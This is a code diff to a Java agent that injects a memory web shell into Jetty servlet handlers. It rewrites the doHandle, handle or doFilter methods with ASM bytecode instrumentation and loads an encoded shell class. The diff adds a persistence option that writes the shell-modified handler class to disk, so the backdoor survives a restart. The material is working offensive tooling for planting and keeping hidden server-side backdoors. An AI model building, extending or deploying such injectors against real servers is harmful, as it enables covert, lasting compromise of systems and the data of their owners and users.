@@ -1,9 +1,11 @@
 package com.reajason.javaweb.memshell.injector.jetty;
 
+import com.reajason.javaweb.agent.AgentPersistence;
 import org.objectweb.asm.*;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.Instrumentation;
 import java.security.ProtectionDomain;
@@ -34,24 +36,37 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
-        launch(inst);
+        launch(args, inst);
     }
 
     public static void agentmain(String args, Instrumentation inst) throws Exception {
-        launch(inst);
+        launch(args, inst);
     }
 
-    private static void launch(Instrumentation inst) throws Exception {
+    private static void launch(String args, Instrumentation inst) throws Exception {
         System.out.println("MemShell Agent is starting");
+        boolean persist = isPersistent(args);
+        boolean targetFound = false;
         inst.addTransformer(new JettyHandlerAgentInjector(), true);
         for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
             String name = allLoadedClass.getName();
             for (String targetClass : TARGET_CLASSES) {
                 if (targetClass.replace("/", ".").equals(name)) {
+                    targetFound = true;
                     inst.retransformClasses(allLoadedClass);
+                    if (persist) {
+                        persist(allLoadedClass);
+                    }
                 }
             }
         }
+        if (persist && !targetFound) {
+            throw new IllegalStateException("Cannot persist before a Jetty servlet handler class is loaded");
+        }
+    }
+
+    static boolean isPersistent(String args) {
+        return AgentPersistence.isPersistent(args);
     }
 
     @Override
@@ -59,26 +74,12 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
     public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                             ProtectionDomain protectionDomain, byte[] bytes) {
         if (TARGET_CLASSES.contains(className)) {
-            String targetMethodName = "doHandle";
-            if (className.contains("mortbay")) {
-                targetMethodName = "handle";
-            }
-            if (className.contains("ee10") || className.contains("ee11")) {
-                targetMethodName = "doFilter";
-            }
+            String targetMethodName = getTargetMethodName(className);
             defineTargetClass(loader);
             try {
-                ClassReader cr = new ClassReader(bytes);
-                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
-                    @Override
-                    protected ClassLoader getClassLoader() {
-                        return loader;
-                    }
-                };
-                ClassVisitor cv = getClassVisitor(cw, targetMethodName);
-                cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                byte[] transformedBytes = transformClass(loader, bytes, getClassName(), targetMethodName);
                 System.out.println("MemShell Agent is working at " + className.replace("/", ".") + "." + targetMethodName);
-                return cw.toByteArray();
+                return transformedBytes;
             } catch (Exception e) {
                 e.printStackTrace();
             }
@@ -86,8 +87,36 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
         return bytes;
     }
 
+    private static String getTargetMethodName(String className) {
+        if (className.contains("mortbay")) {
+            return "handle";
+        }
+        if (className.contains("ee10") || className.contains("ee11")) {
+            return "doFilter";
+        }
+        return "doHandle";
+    }
+
+    private static byte[] transformClass(final ClassLoader loader, byte[] bytes, String shellClassName,
+                                         String targetMethodName) {
+        ClassReader cr = new ClassReader(bytes);
+        ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
+            @Override
+            protected ClassLoader getClassLoader() {
+                return loader;
+            }
+        };
+        ClassVisitor cv = getClassVisitor(cw, targetMethodName, shellClassName);
+        cr.accept(cv, ClassReader.EXPAND_FRAMES);
+        return cw.toByteArray();
+    }
+
     @SuppressWarnings("all")
     public static ClassVisitor getClassVisitor(ClassVisitor cv, String targetMethodName) {
+        return getClassVisitor(cv, targetMethodName, getClassName());
+    }
+
+    private static ClassVisitor getClassVisitor(ClassVisitor cv, String targetMethodName, final String shellClassName) {
         return new ClassVisitor(Opcodes.ASM9, cv) {
             @Override
             public MethodVisitor visitMethod(int access, String name, String descriptor,
@@ -95,7 +124,7 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
                 MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                 if (targetMethodName.equals(name)) {
                     Type[] argumentTypes = Type.getArgumentTypes(descriptor);
-                    return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
+                    return new AgentShellMethodVisitor(mv, argumentTypes, shellClassName);
                 }
                 return mv;
             }
@@ -224,6 +253,19 @@ public class JettyHandlerAgentInjector implements ClassFileTransformer {
             }
             return index;
         }
+    }
+
+    static File persist(Class<?> targetClass) throws Exception {
+        return persist(targetClass, getClassName(), gzipDecompress(decodeBase64(getBase64String())));
+    }
+
+    static File persist(Class<?> targetClass, final String shellClassName, byte[] shellClassBytes) throws Exception {
+        return AgentPersistence.persist(targetClass, shellClassName, shellClassBytes, new AgentPersistence.Transformer() {
+            @Override
+            public byte[] transform(ClassLoader loader, byte[] classBytes) {
+                return transformClass(loader, classBytes, shellClassName, getTargetMethodName(targetClass.getName()));
+            }
+        });
     }
 
     @SuppressWarnings("all")
